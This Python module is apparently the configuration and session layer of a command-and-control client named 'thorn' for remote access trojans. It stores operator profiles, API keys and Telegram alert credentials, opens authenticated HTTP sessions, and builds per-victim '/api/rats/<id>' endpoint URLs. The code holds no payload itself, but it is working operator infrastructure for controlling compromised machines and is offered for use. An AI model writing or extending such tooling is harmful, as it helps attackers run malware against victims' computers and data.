"""C2 connection config, HTTP session, and shared API helpers."""

import json
from pathlib import Path
from urllib.parse import quote

import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

from .ui import err

VERSION      = "2.0.0"
CONFIG_PATH  = Path.home() / ".thorn.json"
HISTORY_PATH = Path.home() / ".thorn_history"

# ── Profile store ─────────────────────────────────────────────────────────────
# v2 format:  { "active": "name", "profiles": { "name": { "url": ..., "api_key": ... } } }
# v1 format:  { "url": ..., "api_key": ... }   — migrated transparently on load

def _migrate(data: dict) -> dict:
    """Upgrade a v1 flat config to the v2 profile-store format."""
    if "profiles" in data:
        return data
    return {"active": "default", "profiles": {"default": dict(data)}}

def _load_store() -> dict:
    if not CONFIG_PATH.exists():
        return {"active": None, "profiles": {}}
    try:
        return _migrate(json.loads(CONFIG_PATH.read_text()))
    except Exception:
        return {"active": None, "profiles": {}}

def _save_store(store: dict):
    CONFIG_PATH.write_text(json.dumps(store, indent=2))

# ── Public helpers ────────────────────────────────────────────────────────────

def load_config():
    """Return the active profile dict {url, api_key, ...} or None."""
    store = _load_store()
    active = store.get("active")
    if not active:
        return None
    return store["profiles"].get(active)

def list_profiles() -> list:
    """Return [(name, profile_dict, is_active), ...] sorted by name."""
    store = _load_store()
    active = store.get("active")
    return [
        (name, profile, name == active)
        for name, profile in sorted(store["profiles"].items())
    ]

def save_profile(name: str, url: str, api_key: str):
    """Save or update a named profile and set it as active."""
    store = _load_store()
    existing = store["profiles"].get(name, {})
    store["profiles"][name] = {**existing, "url": url, "api_key": api_key}
    store["active"] = name
    _save_store(store)

def switch_profile(name: str) -> bool:
    """Switch the active profile. Returns False if it doesn't exist."""
    store = _load_store()
    if name not in store["profiles"]:
        return False
    store["active"] = name
    _save_store(store)
    return True

def delete_profile(name: str) -> bool:
    """Delete a named profile. Returns False if it doesn't exist."""
    store = _load_store()
    if name not in store["profiles"]:
        return False
    del store["profiles"][name]
    if store.get("active") == name:
        remaining = list(store["profiles"])
        store["active"] = remaining[0] if remaining else None
    _save_store(store)
    return True

def save_telegram(bot_token: str, chat_id: str):
    """Persist Telegram credentials into the active profile."""
    store = _load_store()
    active = store.get("active")
    if active and active in store["profiles"]:
        store["profiles"][active]["telegram_bot_token"] = bot_token
        store["profiles"][active]["telegram_chat_id"]   = chat_id
        _save_store(store)

def clear_telegram():
    """Remove Telegram credentials from the active profile."""
    store = _load_store()
    active = store.get("active")
    if active and active in store["profiles"]:
        store["profiles"][active].pop("telegram_bot_token", None)
        store["profiles"][active].pop("telegram_chat_id",   None)
        _save_store(store)

def load_telegram() -> tuple:
    """Return (bot_token, chat_id) from the active profile, or (None, None)."""
    cfg = load_config()
    if not cfg:
        return None, None
    return cfg.get("telegram_bot_token"), cfg.get("telegram_chat_id")

def save_theme(theme: str):
    """Persist theme into the active profile."""
    store = _load_store()
    active = store.get("active")
    if active and active in store["profiles"]:
        store["profiles"][active]["theme"] = theme
        _save_store(store)

def normalise_url(url: str) -> str:
    """Add https:// if no scheme is present."""
    url = url.strip()
    if url and not url.startswith(("http://", "https://")):
        url = "https://" + url
    return url

# ── Session ───────────────────────────────────────────────────────────────────

def get_session():
    cfg = load_config()
    if not cfg:
        return None, None
    s = requests.Session()
    s.cookies.set("auth", cfg["api_key"])
    s.verify = True
    s.headers.update({"Accept": "application/json"})
    return s, cfg["url"].rstrip("/")

def rat_url(url, rat_id, *parts):
    """Build a rat-specific API URL with the rat_id safely percent-encoded."""
    encoded = quote(rat_id, safe="")
    path    = "/".join(["", "api", "rats", encoded] + list(parts))
    return url + path

def check(resp):
    if resp.status_code == 401:
        err("Unauthorized — check your API key")
        return None
    if not resp.ok:
        err(f"HTTP {resp.status_code}: {resp.text[:200]}")
        return None
    return resp
